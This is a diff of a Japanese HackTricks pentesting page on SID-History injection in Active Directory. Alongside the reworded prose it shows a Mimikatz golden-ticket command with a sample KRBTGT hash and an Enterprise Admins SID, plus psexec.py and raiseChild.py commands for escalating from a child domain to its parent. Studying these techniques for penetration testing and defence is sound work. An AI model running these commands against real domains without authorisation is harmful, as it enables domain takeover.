@@ -1,28 +1,28 @@
-# SID-History Injection
+# SID-History Injection（SID履歴インジェクション）
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つけてください
-* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
-* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセス**したいですか、または**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションです
+* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
+* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。
 
 </details>
 
-## 攻撃
+## SID履歴インジェクション攻撃
 
-SID履歴は、ユーザーが1つのドメインから別のドメインに移動する場合をサポートするために設計されました。**ユーザーの以前のSIDが新しいアカウントのSID履歴に追加**されることで、「古い」ドメインのリソースへのアクセスが維持されます。そのため、特権グループ（EAs、DAsなど）のSIDを親ドメインに追加することで、親のすべてのリソースにアクセスできるようになります。
+**SID履歴インジェクション攻撃**の焦点は、**ドメイン間のユーザーマイグレーションを支援**しつつ、新しいアカウントに以前のセキュリティ識別子（SID）をSID履歴に組み込むことで、以前のドメインからのリソースへのアクセスを継続することです。特筆すべきは、このプロセスを悪用して、親ドメインの高特権グループ（Enterprise AdminsやDomain Adminsなど）のSIDをSID履歴に追加することで、権限のないアクセスを付与できることです。この悪用により、親ドメイン内のすべてのリソースにアクセスできます。
 
-これは、[**Golden**](sid-history-injection.md#golden-ticket)または[**Diamond Ticket**](sid-history-injection.md#diamond-ticket)を使用して達成できます。
+この攻撃を実行するためには、**Golden Ticket**または**Diamond Ticket**の作成を通じて2つの方法が存在します。
 
-**"Enterprise Admins"**グループの**SID**を見つけるには、**ルートドメイン**の**SID**を見つけて、`S-1-5-21-<root domain>-519`に設定します。たとえば、ルートドメインSID `S-1-5-21-280534878-1496970234-700767426`から**"Enterprise Admins"**グループのSIDは `S-1-5-21-280534878-1496970234-700767426-519`です。
+**"Enterprise Admins"**グループのSIDを特定するためには、まずルートドメインのSIDを特定する必要があります。その後、Enterprise AdminsグループのSIDは、ルートドメインのSIDに`-519`を追加することで構築できます。たとえば、ルートドメインのSIDが`S-1-5-21-280534878-1496970234-700767426`である場合、"Enterprise Admins"グループの結果として得られるSIDは`S-1-5-21-280534878-1496970234-700767426-519`となります。
 
-また、**Domain Admins**グループを使用することもでき、これは**512**で終わります。
+**Domain Admins**グループを使用することもでき、これは**512**で終わります。
 
-他のドメインのグループ（たとえば「Domain Admins」）のSIDを見つける別の方法は次のとおりです：
+他のドメインのグループ（たとえば"Domain Admins"）のSIDを見つける別の方法は、次のとおりです：
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
@@ -82,8 +82,6 @@ ls \\mcorp-dc.moneycorp.local\c$
 {% endcode %}
 
 侵害されたドメインのKRBTGTハッシュを使用して、ルートまたはエンタープライズ管理者に昇格します：
-
-{% code overflow="wrap" %}
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -129,12 +127,12 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 
 #### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)を使用した自動化
 
-これは、**子ドメインから親ドメインへの昇格を自動化する**Impacketスクリプトです。スクリプトには以下が必要です：
+これは、**子ドメインから親ドメインへの昇格を自動化する**Impacketスクリプトです。このスクリプトには以下が必要です：
 
 * ターゲットのドメインコントローラー
 * 子ドメインの管理者ユーザーの資格情報
 
-手順は次の通りです：
+手順は以下の通りです：
 
 * 親ドメインのEnterprise AdminsグループのSIDを取得します
 * 子ドメインのKRBTGTアカウントのハッシュを取得します
@@ -146,17 +144,17 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
 ## 参考文献
-
-* [https://studylib.net/doc/25696115/crto](https://studylib.net/doc/25696115/crto)
+* [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
+* [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
 * [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
-* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
+* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
